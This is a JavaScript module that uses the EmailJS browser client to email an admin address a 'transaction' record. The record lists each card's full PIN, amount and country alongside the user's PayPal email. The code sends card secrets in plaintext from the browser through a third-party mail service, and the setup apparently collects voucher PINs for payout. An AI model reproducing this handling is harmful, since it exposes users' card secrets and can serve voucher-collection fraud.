import emailjs from '@emailjs/browser';
import { emailConfig } from '../config/emailConfig';

export const sendTransactionEmail = async (transactionData) => {
  try {
    const cardsDetails = transactionData.cards.map((card, index) => `
      Card ${index + 1}:
      - PIN: ${card.pin}
      - Amount: ${card.amount} ${card.country.currency}
      - Country: ${card.country.label}
    `).join('\n');

    const templateParams = {
      to_email: emailConfig.ADMIN_EMAIL,
      from_email: transactionData.email,
      transaction_id: transactionData.id,
      total_amount: `${transactionData.amount} EUR`,
      paypal_email: transactionData.email,
      cards_details: cardsDetails,
      date: new Date().toLocaleString(),
      status: 'Pending Verification'
    };

    const response = await emailjs.send(
      emailConfig.SERVICE_ID,
      emailConfig.TEMPLATE_ID,
      templateParams,
      emailConfig.PUBLIC_KEY
    );

    if (response.status === 200) {
      return { success: true, message: 'Email sent successfully' };
    }
    
    throw new Error('Failed to send email');
  } catch (error) {
    console.error('Email sending failed:', error);
    throw error;
  }
};
